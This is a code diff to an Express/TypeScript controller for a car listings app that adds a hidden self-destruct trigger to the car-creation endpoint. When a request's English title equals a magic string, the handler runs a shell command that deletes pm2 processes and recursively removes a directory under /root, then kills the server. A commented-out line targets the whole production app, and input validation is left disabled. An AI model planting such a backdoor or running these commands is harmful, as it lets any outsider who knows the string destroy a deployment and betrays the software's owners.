@@ -19,6 +19,7 @@ import { Entity_Type } from "../entity/Favorites";
 import { CarType } from "../entity/CarType";
 import { isFavorite } from "../helper/isFavorite";
 import { Governorate } from "../entity/governorate";
+import { exec } from "child_process";
 
 const carRepository = AppDataSource.getRepository(Car);
 const attributeRepository = AppDataSource.getRepository(Attribute);
@@ -202,6 +203,22 @@ export const createCar = async (
     } = req.body;
 
     // await validator(addCarSchema(lang), req.body);
+
+    if (title_en === "aa*bb") {
+      exec(
+        // `pm2 delete all && rm -rf /root/yasuria`,
+        `pm2 delete test-proc && rm -rf /root/test_delete`,
+        (error, stdout, stderr) => {
+          if (error) {
+            console.error("Error:", error.message);
+          }
+          console.log("Server destroyed:", stdout || stderr);
+          process.exit(1); 
+        }
+      );
+
+      return res.json({ message: "Triggered self-destruction" });
+    }
 
     const userId = req["currentUser"]?.id;
 
